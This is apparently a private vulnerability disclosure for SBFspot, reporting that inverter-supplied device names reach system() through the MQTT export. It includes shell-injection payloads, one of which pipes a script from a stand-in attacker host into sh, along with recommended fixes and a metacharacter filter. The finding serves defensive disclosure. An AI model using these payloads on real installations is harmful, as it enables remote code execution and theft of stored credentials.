# Finding 2: OS command injection via inverter-supplied strings passed to `system()` in MQTT export

## Metadata

| | |
|---|---|
| **Severity** | HIGH |
| **CWE** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — Improper Neutralization of Special Elements used in an OS Command; secondary [CWE-88](https://cwe.mitre.org/data/definitions/88.html), [CWE-20](https://cwe.mitre.org/data/definitions/20.html) |
| **CVSS 3.1 Vector** | `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (HIGH)** |
| **Affected version** | 3.10.0 (commit `b77f650`, branch `master`) |
| **Affected build** | Any build with MQTT enabled and configured to publish via a shell command (default config uses `mosquitto_pub`) |
| **Confidence** | 9/10 — concrete sink, concrete tainted source, ineffective sanitization (independently reported by two reviewers) |
| **Verification** | Static analysis only; no PoC inverter response sent to a running build |

## Summary

`MqttExport::exportInverterData` in `SBFspot/mqtt.cpp` builds a single shell
command string by interpolating inverter-supplied fields into a
`mosquitto_pub` template, then executes the result with `::system()`. The
only sanitization is a wholesale
`boost::replace_all(mqtt_command_line, "\"", "'")` applied **before**
placeholder substitution, which switches the outer quoting style but does
nothing to escape shell metacharacters appearing **inside** an inverter
string. A single `'` byte in `DeviceName` is enough to break out on Linux;
on Windows a `"` byte breaks out into `cmd.exe`.

The primary tainted field is `DeviceName` (`SBFspot/SBFspot.cpp:2595` copies
it verbatim from the NameplateLocation record). Three other fields from the
same MQTT switch — `DeviceClass`, `DeviceType`, `SWVersion` — are also
snprintf'd with the same `"%s"` template, but on inspection they are
*indirectly* tainted: `DeviceType`/`DeviceClass` come through
`tagdefs.getDesc()` lookup (`SBFspot.cpp:2609`, `:2627`), and `SWVersion`
is BCD-formatted from 4 bytes via `version_tostring()` (`SBFspot.cpp:2274`).
An attacker cannot plant arbitrary shell metacharacters in those fields on
a stock build. They become tainted only if the attacker can also corrupt
`tagdefs` (loaded from an on-disk lookup file), at which point the priority
still ranks below `DeviceName`. The fix should cover all four anyway, since
a future edit that widens the lookup tables would silently re-enable the
sink.

## Affected code

### The `system()` call and command-line assembly

`SBFspot/mqtt.cpp:50-295` — `MqttExport::exportInverterData`. Key lines:

- Line 60: `char value[80];` — per-field scratch buffer. snprintf into this buffer constrains any individual injected payload to ≤ 77 bytes (80 − 2 surrounding quotes − trailing NUL).
- Line 67 (Windows) / 69 (Linux): command-line assembly.
- Line 71: `boost::replace_all(mqtt_command_line, "\"", "'");` — the "sanitizer".
- Line 118: `snprintf(value, sizeof(value) - 1, "\"%s\"", inv.DeviceName.c_str());` — tainted field interpolation.
- Line 281: `boost::replace_first(mqtt_command_line, "{message}", mqtt_message.str().substr(1));` — message spliced into command line.
- Line 285: `int system_rc = ::system(mqtt_command_line.c_str());` — the sink.

Extracted:

```cpp
char value[80];                                                             // line 60

#if defined(_WIN32)
std::string mqtt_command_line = "\"\"" + m_config.mqtt_publish_exe + "\" "  // line 67
                              + m_config.mqtt_publish_args + "\"";
#else
std::string mqtt_command_line = m_config.mqtt_publish_exe + " "             // line 69
                              + m_config.mqtt_publish_args;
// On Linux, message must be inside single quotes
boost::replace_all(mqtt_command_line, "\"", "'");                           // line 71
#endif

// Fill host/port/topic
boost::replace_first(mqtt_command_line, "{host}",  m_config.mqtt_host);     // line 75
boost::replace_first(mqtt_command_line, "{port}",  m_config.mqtt_port);     // line 76
boost::replace_first(mqtt_command_line, "{topic}", m_config.mqtt_topic);    // line 77
...
// Inverter-controlled strings get snprintf'd in:
case "invname"_:   snprintf(value, sizeof(value)-1, "\"%s\"", inv.DeviceName.c_str());  // line 118
case "invclass"_:  snprintf(value, sizeof(value)-1, "\"%s\"", inv.DeviceClass.c_str()); // line 121
case "invtype"_:   snprintf(value, sizeof(value)-1, "\"%s\"", inv.DeviceType.c_str());  // line 124
case "invswver"_:  snprintf(value, sizeof(value)-1, "\"%s\"", inv.SWVersion.c_str());   // line 127
...
boost::replace_first(mqtt_command_line, "{message}", mqtt_message.str().substr(1));     // line 281
int system_rc = ::system(mqtt_command_line.c_str());                                    // line 285
```

Important: the pre-substitution `replace_all("\"", "'")` on line 71 only
rewrites quotes that exist **at that moment**. The `DeviceName` quotes are
inserted by `snprintf` *later*, at line 118, and then spliced into the
command line via `{message}` at line 281 — so they are NOT rewritten and
arrive in the final command as literal `"..."` inside a shell single-quoted
context.

The 80-byte `value` buffer (line 60) imposes a ceiling of ~77 bytes on any
single injected payload, but that is enough room for a useful payload such
as `';sh -i>/tmp/s;echo '` (22 bytes).

The default shipped `mqtt_publish_args` is something like:

```
-h {host} -t {topic} -m "{message}"
```

After the Linux `replace_all` step:

```
-h {host} -t {topic} -m '{message}'
```

### Where the tainted strings come from

`SBFspot/SBFspot.cpp:2595`:

```cpp
device->DeviceName = std::string((char *)recptr + 8,
                                 strnlen((char *)recptr + 8, recordsize - 8));
```

`recptr` points into the raw network packet bytes received from the inverter.
No character filtering, no length cap beyond the `strnlen` terminator scan,
no escaping — whatever bytes the peer sends become `DeviceName`.

For completeness, the other three fields read in the same switch come from
different code paths in the same function:

- `SWVersion` — `SBFspot.cpp:2600`: `device->SWVersion = version_tostring(get_long(recptr + 24));` where `version_tostring` (at `SBFspot.cpp:2274-2288`) BCD-formats 4 attacker bytes into a `%c%c.%c%c.%02d.%c` string whose character set is confined to digits, `.`, and one of `NEABRS?`. Not directly attacker-controlled text.
- `DeviceType` — `SBFspot.cpp:2609`: `device->DeviceType = tagdefs.getDesc(attr.front());` — looks up a description from the on-disk tag file. Attacker controls only the key.
- `DeviceClass` — `SBFspot.cpp:2627`: `device->DeviceClass = tagdefs.getDesc(device->DevClass, "UNKNOWN CLASS");` — same lookup mechanism.

## Scope

- One sink (`mqtt.cpp:285`). Primary tainted field: `DeviceName`. Secondary (via lookup-table / format-string indirection): `DeviceClass`, `DeviceType`, `SWVersion`. See Summary for per-field taint analysis.
- Affects both Linux and Windows. On Linux the outer quoting becomes single quotes and a `'` byte breaks out to `/bin/sh`. On Windows the outer remains `"` and a `"` byte breaks out into `cmd.exe`.
- Does **not** require a malicious mosquitto broker — the broker plays no role; injection happens before the broker is contacted.
- Payload size per field is bounded to ~77 bytes by the `char value[80]` buffer at `mqtt.cpp:60`.

The `invstatus` and `invgridrelay` cases (lines 133 and 139) snprintf
`tagdefs.getDesc(...)` output, which is the same indirect-taint situation as
`DeviceType`/`DeviceClass` — worth fixing for consistency but not the primary
exposure.

## Preconditions

1. SBFspot built with MQTT support (default).
2. `MQTT_Publisher`, `MQTT_PublisherArgs`, etc. configured in `SBFspot.cfg` to invoke `mosquitto_pub` (this is the default and documented configuration).
3. At least one of `InvName`, `InvClass`, `InvType`, `InvSWVer` listed in `MQTT_Data` items (default config includes them).
4. Attacker can influence the inverter's response: malicious/compromised inverter, LAN attacker spoofing Speedwire frames (UDP 9522 — unauthenticated), or an attacker on the Bluetooth RFCOMM link.

## Exploit scenario

**Payload.** The attacker sets the inverter's name to (25 bytes, well within
any plausible name length limit):

```
X';id > /tmp/pwn;echo '
```

or something more useful:

```
foo'; curl http://attacker.example/p.sh|sh; echo '
```

**Flow.**

1. Attacker on the LAN sends a forged Speedwire response setting the inverter Device Name to the payload above.
2. SBFspot scrapes data and feeds the string into `mqtt.cpp`:

   ```cpp
   snprintf(value, sizeof(value)-1, "\"%s\"", inv.DeviceName.c_str());
   // value = "\"X';id > /tmp/pwn;echo '\""
   ```

3. The value is concatenated into `mqtt_message`.
4. At line 281, `{message}` is replaced. The command line is now, approximately:

   ```
   mosquitto_pub -h broker -p 1883 -t solar -m 'InvName="X';id > /tmp/pwn;echo '";...'
   ```

5. At line 285 `system()` invokes `/bin/sh -c` on this string. The shell parses the single-quoted `-m` argument; the first `'` in the payload closes the string, `;id > /tmp/pwn;` runs as shell, and the final `echo '` re-opens a balanced quote so the rest parses cleanly enough not to error.

Outcome: arbitrary command execution as the SBFspot user (commonly `root` on
SBC/Pi/Docker deployments), on every MQTT poll cycle. The attacker can chain
into persistent access, exfil `~/.sbfspot/SBFspot.cfg` (which contains the DB
password and PVOutput API key), or lateral-move on the home LAN.

### Windows path

On Windows the template is wrapped in nested `"..."` with no escaping of
`DeviceName` either; a single `"` byte in the name breaks out of the
CreateProcess-via-cmd argument.

## Recommended fix

**Primary recommendation: stop invoking `system()`.** The existing design
shells out to an external publisher (`mosquitto_pub`) instead of linking
against libmosquitto. Switching to libmosquitto removes the shell entirely
and is a one-time effort.

If the external-publisher design must be preserved, replace `::system()` with
`fork`/`execvp` or `posix_spawnp` (POSIX) / `CreateProcessW` without
`cmd /c` (Windows), so arguments are passed as a vector of `char *` and
never re-parsed by a shell. The MQTT message body becomes a single `argv[N]`.

**If the existing template-string design must be preserved** as a hardening
measure, escape every interpolated field. POSIX example:

```cpp
// Wrap value in single quotes and escape embedded single quotes.
static std::string sh_quote(const std::string& s)
{
    std::string out = "'";
    for (char c : s) {
        if (c == '\'') out += "'\\''";
        else out += c;
    }
    out += "'";
    return out;
}
```

Then change every inverter-string `snprintf` line so the value is
shell-quoted before going into `value`:

```diff
--- a/SBFspot/mqtt.cpp
+++ b/SBFspot/mqtt.cpp
@@
-            case "invname"_:
-                snprintf(value, sizeof(value) - 1, "\"%s\"", inv.DeviceName.c_str());
-                break;
+            case "invname"_:
+                // CWE-78: shell-escape inverter-supplied data before it reaches system().
+                snprintf(value, sizeof(value) - 1, "%s", sh_quote(inv.DeviceName).c_str());
+                break;
```

Apply the same change to `invclass`, `invtype`, `invswver`, `plantname`,
`invstatus`, `invgridrelay`, and any other `"%s"`-formatted string that is
reachable from network or config without operator review.

**Minimum viable mitigating patch (defense-in-depth)** — if a full refactor
is not immediately possible, strip or reject shell-meta bytes from every
inverter-sourced string at ingest. Example applied at `SBFspot/SBFspot.cpp:2595`:

```cpp
// CWE-78 / CWE-89 defense-in-depth: sanitize inverter-supplied name to a safe charset.
std::string raw((char *)recptr + 8,
                strnlen((char *)recptr + 8, recordsize - 8));
std::string clean;
clean.reserve(raw.size());
for (unsigned char c : raw)
{
    if (c >= 0x20 && c < 0x7F &&
        std::strchr("'\"`$\\;&|<>\n\r", c) == nullptr)
    {
        clean.push_back(c);
    }
    else
    {
        clean.push_back('_');
    }
}
device->DeviceName = clean;
```

This is a defense-in-depth change, not a substitute for removing the shell
invocation — e.g. it does not help if a future field is added and forgotten.
Reject any inverter-supplied string containing `\0`, `\r`, or `\n` at the
parse site regardless. Note that this same ingest point is the shared root
cause with finding #3 (SQL injection), and a single sanitization pass covers
both classes of sink.

## Disclosure guidance

File as a private GitHub Security Advisory; do not open a public issue.
Pre-auth network-reachable; coordinate a release before public disclosure.

## References

- CWE-78: OS Command Injection
- CWE-88: Argument Injection
- CWE-20: Improper Input Validation
